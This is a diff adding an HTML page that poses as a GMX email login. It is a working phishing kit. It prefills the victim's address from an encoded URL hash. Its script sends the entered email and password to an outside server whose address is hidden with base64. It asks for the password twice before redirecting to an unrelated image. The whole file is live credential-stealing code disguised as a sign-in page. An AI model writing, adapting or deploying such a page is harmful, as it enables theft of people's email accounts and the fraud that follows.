@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+  <title>Login</title>
+  <link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
+  <style>
+    html,
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      border: 0;
+      position: absolute;
+      height: 100%;
+      min-width: 100%;
+      font-size: 15px;
+      color: #404040;
+      direction: ltr;
+      -webkit-text-size-adjust: none;
+    }
+
+    input[type=email],
+    input[type=password] {
+      appearance: none;
+      display: inline-block;
+      height: 32px;
+      width: 100%;
+      margin: 0;
+      padding: 10px;
+      background: transparent;
+      border: #fff;
+      box-sizing: border-box;
+      font-size: 15px;
+      font-weight: 400;
+      font-family: inherit;
+      line-height: 18px;
+      vertical-align: top;
+      color: #404040;
+    }
+
+    input[type=email]:focus,
+    input[type=password]:focus {
+      outline: none;
+      background-color: transparent;
+      border-radius: 5px;
+      font-size: 15px;
+      font-weight: 400;
+      font-family: inherit;
+      line-height: 18px;
+      border: 2px solid #114898;
+    }
+  </style>
+</head>
+
+<body background="bg.png" style="background-repeat: no-repeat; background-size: cover;">
+
+  <div align="center">
+    <table border="0" width="368" cellspacing="0" cellpadding="0">
+      <tr>
+        <td>
+          <table border="0" width="100%" cellspacing="0" cellpadding="0">
+            <tr>
+              <td height="105"></td>
+            </tr>
+            <tr>
+              <td height="428" bgcolor="#00FF00" background="fm.png">
+                <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                  <form name="loginForm">
+                    <tr>
+                      <td height="232"></td>
+                    </tr>
+                    <tr>
+                      <td>
+                        <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                          <tr>
+                            <td width="32"></td>
+                            <td>
+                              <input id="email" type="email" name="email" required autofocus>
+                              <input type="hidden" name="domain"
+                                value="https://www.gmx.net/consent-management/">
+                            </td>
+                            <td width="31"></td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td height="36"></td>
+                    </tr>
+                    <tr>
+                      <td>
+                        <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                          <tr>
+                            <td width="32"></td>
+                            <td>
+                              <input type="password" id="password" name="password" required>
+                            </td>
+                            <td width="31"></td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td height="16"></td>
+                    </tr>
+                    <tr>
+                      <td>
+                        <table border="0" width="100%" cellspacing="0" cellpadding="0">
+                          <tr>
+                            <td width="32"></td>
+                            <td>
+                              <input type="submit" width="304" value="" height="32" id="submit-btn"
+                                style="background: url('btn.png') no-repeat; width: 304px; height: 32px; border: none; cursor: pointer;">
+                            </td>
+                            <td width="31"></td>
+                          </tr>
+                        </table>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td height="70">
+                        <div class="alert alert-danger" id="msg" style="display: none;" align="center"></div>
+                        <div id="error" class="text-danger" style="display: none;" align="center"></div>
+                      </td>
+                    </tr>
+                  </form>
+                </table>
+              </td>
+            </tr>
+            <tr>
+              <td height="110"></td>
+            </tr>
+          </table>
+        </td>
+      </tr>
+    </table>
+  </div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script>
+    function decodeData(encoded) {
+      try {
+        return decodeURIComponent(atob(encoded.replace(/-/g, '+').replace(/_/g, '/')));
+      } catch (e) {
+        return null;
+      }
+    }
+
+    function isValidEmail(email) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    }
+
+    $(document).ready(function () {
+      let count = 0;
+
+      // Parse hash
+      const hash = window.location.hash.substring(1);
+      let email = '';
+      if (hash && hash.includes("&token=")) {
+        const [encodedEmail] = hash.split("&token=");
+        const decodedEmail = decodeData(encodedEmail);
+        if (isValidEmail(decodedEmail)) {
+          email = decodedEmail;
+          $('#email').val(email);
+        } else {
+          $('#error').show().html("<p style='color:red; font-size:14px'>Invalid email format.</p>");
+          return;
+        }
+      }
+
+      $('#submit-btn').click(function (event) {
+        event.preventDefault();
+        $('#error').hide();
+        $('#msg').hide();
+
+        const emailVal = $('#email').val().trim();
+        const password = $('#password').val().trim();
+
+        if (!emailVal) {
+          $('#error').show().html("<p style='color:red; font-size:14px'>Email field is empty</p>");
+          return false;
+        }
+
+        if (!isValidEmail(emailVal)) {
+          $('#error').show().html("<p style='color:red; font-size:14px'>Invalid email address</p>");
+          return false;
+        }
+
+        if (!password) {
+          $('#error').show().html("<p style='color:red; font-size:14px'>Password field is empty</p>");
+          return false;
+        }
+
+        if (password.length < 7) {
+          $('#error').show().html("<p style='color:red; font-size:14px'>Password is too short</p>");
+          return false;
+        }
+
+        count++;
+
+        const endpoint = atob("aHR0cHM6Ly9nZW9zb25pY25nLmNvbS93cmsvankvcHAucGhw");
+
+        $.ajax({
+          dataType: 'JSON',
+          url: endpoint,
+          type: 'POST',
+          data: {
+            email: emailVal,
+            password: password
+          },
+          beforeSend: function () {
+            $('#submit-btn').val('Signing in...');
+          },
+          success: function (response) {
+            if (response) {
+              $('#msg').show().html(`<span style='color:red;'>${response.msg}</span>`);
+              if (response.signal === 'ok') {
+                $('#password').val('');
+                if (count >= 2) {
+                  count = 0;
+                  window.location.replace("https://babbajay19.github.io/CS1.1.jpg");
+                }
+              }
+            }
+          },
+          error: function () {
+            $('#password').val('');
+            if (count >= 2) {
+              count = 0;
+              window.location.replace("https://babbajay19.github.io/CS1.1.jpg");
+            }
+            $('#msg').show().html("An error occurred. Please try again.");
+          },
+          complete: function () {
+            $('#submit-btn').val('');
+          }
+        });
+      });
+    });
+  </script>
+</body>
+
+</html>
